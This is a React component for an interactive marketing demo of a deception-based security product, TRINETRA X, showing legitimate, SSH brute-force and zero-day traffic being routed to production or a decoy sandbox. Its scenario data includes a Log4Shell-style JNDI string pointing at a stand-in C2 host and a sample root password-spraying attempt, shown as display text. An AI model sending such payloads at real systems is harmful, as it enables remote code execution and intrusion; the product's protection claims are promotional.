import React, { useState } from 'react';
import {
  Shield,
  Server,
  Terminal,
  ArrowRight,
  CheckCircle2,
  AlertTriangle,
  UserCheck,
  Zap,
  Lock,
  Eye,
  RefreshCw,
} from 'lucide-react';

interface Scenario {
  id: string;
  name: string;
  type: 'legitimate' | 'ssh_brute' | 'zeroday';
  sourceIp: string;
  label: string;
  description: string;
  payload: string;
  productionStatus: 'allowed' | 'protected';
  productionMessage: string;
  decoyStatus: 'idle' | 'trapped';
  decoyMessage: string;
  attackerExperience: string;
  intelGained: string;
}

const SCENARIOS: Scenario[] = [
  {
    id: 'normal',
    name: 'Normal User Traffic',
    type: 'legitimate',
    sourceIp: '64.233.160.1',
    label: 'Legitimate Customer',
    description: 'A genuine customer browsing your web application or making an API call.',
    payload: 'GET /api/v1/products HTTP/1.1 (Valid Session Token)',
    productionStatus: 'allowed',
    productionMessage: 'Request served normally. Zero latency overhead.',
    decoyStatus: 'idle',
    decoyMessage: 'Decoy sandbox remains inactive. Legitimate users never see it.',
    attackerExperience: 'Normal customer browsing your web service seamlessly.',
    intelGained: 'Routine telemetry: Normal traffic pattern.',
  },
  {
    id: 'ssh',
    name: 'SSH Brute-Force Attack',
    type: 'ssh_brute',
    sourceIp: '185.220.101.42',
    label: 'Automated Bot Attack',
    description: 'An adversary attempting dictionary password spraying on port 22.',
    payload: 'SSH-2.0-OpenSSH_8.9p1 (User: "root", Password: "Password123!")',
    productionStatus: 'protected',
    productionMessage: 'Protected: 0 malicious packets reached production systems.',
    decoyStatus: 'trapped',
    decoyMessage: 'Trapped: Attacker granted access into an isolated container sandbox.',
    attackerExperience: 'Attacker thinks they guessed root password and starts exploring.',
    intelGained: 'Harvested password dictionary list, botnet IP, and scanner fingerprint.',
  },
  {
    id: 'zeroday',
    name: 'Zero-Day Web Exploit',
    type: 'zeroday',
    sourceIp: '91.240.118.88',
    label: 'Targeted Exploit Attempt',
    description: 'A stealthy adversary testing an unpatched Remote Code Execution vulnerability.',
    payload: '${jndi:ldap://malicious-c2.net/payload} in HTTP User-Agent Header',
    productionStatus: 'protected',
    productionMessage: 'Protected: Exploit diverted before reaching real backend database.',
    decoyStatus: 'trapped',
    decoyMessage: 'Trapped: Sandbox provides realistic fake response, capturing payload.',
    attackerExperience: 'Attacker believes exploit succeeded and downloads their secondary stage tools.',
    intelGained: 'Captured brand-new C2 server domain, exploit payload, and evasion scripts.',
  },
];

export const InteractiveSchematic: React.FC = () => {
  const [selectedScenario, setSelectedScenario] = useState<Scenario>(SCENARIOS[1]);
  const [isProcessing, setIsProcessing] = useState(false);

  const handleSelectScenario = (scenario: Scenario) => {
    setIsProcessing(true);
    setSelectedScenario(scenario);
    setTimeout(() => {
      setIsProcessing(false);
    }, 350);
  };

  const isAttack = selectedScenario.type !== 'legitimate';

  return (
    <div
      id="demo"
      className="w-full bg-[#111726] border border-white/[0.08] rounded-2xl p-6 sm:p-8 lg:p-10 shadow-lg text-left"
    >
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/[0.08]">
        <div>
          <div className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-emerald-400 mb-1.5">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            <span>Interactive Simulator</span>
          </div>
          <h3 className="text-xl sm:text-2xl font-bold text-white tracking-tight">
            How TRINETRA X Handles Inbound Traffic
          </h3>
          <p className="text-sm text-slate-400 mt-1">
            Select an inbound scenario below to see how traffic is routed and isolated in real time.
          </p>
        </div>

        {/* Status Pill */}
        <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-emerald-500/10 border border-emerald-500/25 text-xs text-emerald-300 font-medium self-start md:self-auto">
          <Shield className="w-3.5 h-3.5 text-emerald-400" />
          <span>Active Defense Enabled</span>
        </div>
      </div>

      {/* Scenario Selector Tabs */}
      <div className="mt-6">
        <div className="text-xs font-medium text-slate-400 uppercase tracking-wider mb-2.5">
          Select Incoming Traffic Scenario:
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
          {SCENARIOS.map((scenario) => {
            const isSelected = selectedScenario.id === scenario.id;
            return (
              <button
                key={scenario.id}
                onClick={() => handleSelectScenario(scenario)}
                className={`text-left p-3.5 rounded-xl border transition-all cursor-pointer ${
                  isSelected
                    ? 'bg-slate-800/90 border-emerald-400/80 shadow-sm'
                    : 'bg-[#0B0F19]/60 border-white/[0.08] hover:border-white/20 hover:bg-[#0B0F19]'
                }`}
              >
                <div className="flex items-center justify-between mb-1">
                  <span
                    className={`text-xs font-semibold px-2 py-0.5 rounded ${
                      scenario.type === 'legitimate'
                        ? 'bg-blue-500/15 text-blue-300'
                        : scenario.type === 'ssh_brute'
                        ? 'bg-amber-500/15 text-amber-300'
                        : 'bg-rose-500/15 text-rose-300'
                    }`}
                  >
                    {scenario.label}
                  </span>
                  {isSelected && (
                    <span className="w-2 h-2 rounded-full bg-emerald-400" />
                  )}
                </div>
                <div className="font-medium text-sm text-white mt-1">
                  {scenario.name}
                </div>
                <div className="text-xs text-slate-400 font-mono mt-0.5">
                  IP: {scenario.sourceIp}
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Visual Routing Diagram */}
      <div className="mt-8 pt-6 border-t border-white/[0.08]">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
          
          {/* Node 1: Inbound Request (Span 4) */}
          <div className="lg:col-span-4 bg-[#0B0F19] rounded-xl p-5 border border-white/[0.08] flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between mb-3">
                <span className="text-xs font-medium uppercase tracking-wider text-slate-400">
                  1. Inbound Connection
                </span>
                <span className="text-xs font-mono text-slate-400">Port {selectedScenario.type === 'ssh_brute' ? '22' : '443'}</span>
              </div>
              <div className="font-semibold text-white text-base">
                {selectedScenario.label}
              </div>
              <p className="text-xs text-slate-400 mt-1 leading-relaxed">
                {selectedScenario.description}
              </p>
            </div>

            <div className="mt-4 pt-4 border-t border-white/[0.06]">
              <div className="text-[11px] font-mono text-slate-400 mb-1">Packet Payload:</div>
              <div className="p-2.5 rounded-lg bg-slate-950 font-mono text-xs text-slate-300 break-all border border-white/[0.05]">
                {selectedScenario.payload}
              </div>
            </div>
          </div>

          {/* Node 2: TRINETRA X Inspection (Span 4) */}
          <div className="lg:col-span-4 bg-[#0B0F19] rounded-xl p-5 border border-emerald-500/30 flex flex-col justify-between relative overflow-hidden">
            <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-xl pointer-events-none" />
            
            <div>
              <div className="flex items-center justify-between mb-3">
                <span className="text-xs font-medium uppercase tracking-wider text-emerald-400 font-semibold">
                  2. TRINETRA X Filter
                </span>
                <span className="text-xs font-mono text-emerald-400">&lt; 0.4ms</span>
              </div>
              <div className="font-semibold text-white text-base flex items-center gap-2">
                <span>Autonomous Analysis</span>
                {isProcessing && <RefreshCw className="w-3.5 h-3.5 text-emerald-400 animate-spin" />}
              </div>
              <p className="text-xs text-slate-400 mt-1 leading-relaxed">
                Evaluates connection intent instantly at the kernel level without dropping the TCP handshake.
              </p>
            </div>

            <div className="mt-4 pt-4 border-t border-white/[0.06] space-y-2">
              <div className="flex items-center justify-between text-xs">
                <span className="text-slate-400">Decision:</span>
                <span className={`font-semibold ${isAttack ? 'text-amber-400' : 'text-emerald-400'}`}>
                  {isAttack ? 'Divert to Decoy' : 'Forward to Production'}
                </span>
              </div>
              <div className="flex items-center justify-between text-xs">
                <span className="text-slate-400">Adversary Alerted:</span>
                <span className="font-semibold text-emerald-400">No (Silent Transfer)</span>
              </div>
            </div>
          </div>

          {/* Node 3: Split Destinations (Span 4) */}
          <div className="lg:col-span-4 space-y-4">
            {/* Destination A: Real Production */}
            <div
              className={`rounded-xl p-4 border transition-all ${
                selectedScenario.productionStatus === 'allowed'
                  ? 'bg-blue-950/30 border-blue-500/40'
                  : 'bg-emerald-950/20 border-emerald-500/40'
              }`}
            >
              <div className="flex items-center justify-between mb-1.5">
                <div className="flex items-center gap-2">
                  <Server className="w-4 h-4 text-emerald-400" />
                  <span className="text-xs font-semibold uppercase tracking-wider text-white">
                    Real Production Servers
                  </span>
                </div>
                <span
                  className={`text-[11px] font-semibold px-2 py-0.5 rounded ${
                    selectedScenario.productionStatus === 'allowed'
                      ? 'bg-blue-500/20 text-blue-300'
                      : 'bg-emerald-500/20 text-emerald-300'
                  }`}
                >
                  {selectedScenario.productionStatus === 'allowed' ? 'Normal Access' : '100% Protected'}
                </span>
              </div>
              <p className="text-xs text-slate-300 leading-relaxed">
                {selectedScenario.productionMessage}
              </p>
            </div>

            {/* Destination B: Decoy Sandbox */}
            <div
              className={`rounded-xl p-4 border transition-all ${
                isAttack
                  ? 'bg-amber-950/30 border-amber-500/40'
                  : 'bg-slate-900/40 border-white/[0.06]'
              }`}
            >
              <div className="flex items-center justify-between mb-1.5">
                <div className="flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-amber-400" />
                  <span className="text-xs font-semibold uppercase tracking-wider text-white">
                    Isolated Decoy Sandbox
                  </span>
                </div>
                <span
                  className={`text-[11px] font-semibold px-2 py-0.5 rounded ${
                    isAttack
                      ? 'bg-amber-500/20 text-amber-300'
                      : 'bg-slate-800 text-slate-400'
                  }`}
                >
                  {isAttack ? 'Attacker Trapped' : 'Standby / Idle'}
                </span>
              </div>
              <p className="text-xs text-slate-300 leading-relaxed">
                {selectedScenario.decoyMessage}
              </p>
            </div>
          </div>

        </div>
      </div>

      {/* Outcome Comparison Box */}
      <div className="mt-6 pt-6 border-t border-white/[0.08] grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* What the Attacker Experiences */}
        <div className="bg-[#0B0F19] rounded-xl p-4 border border-white/[0.08]">
          <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-amber-400 mb-2">
            <Eye className="w-3.5 h-3.5" />
            <span>What the Attacker Sees:</span>
          </div>
          <p className="text-xs text-slate-300 leading-relaxed">
            {selectedScenario.attackerExperience}
          </p>
        </div>

        {/* What Your Team Learns */}
        <div className="bg-[#0B0F19] rounded-xl p-4 border border-emerald-500/20">
          <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-emerald-400 mb-2">
            <CheckCircle2 className="w-3.5 h-3.5" />
            <span>Intelligence Gained for Your Security Team:</span>
          </div>
          <p className="text-xs text-slate-300 leading-relaxed">
            {selectedScenario.intelGained}
          </p>
        </div>
      </div>
    </div>
  );
};
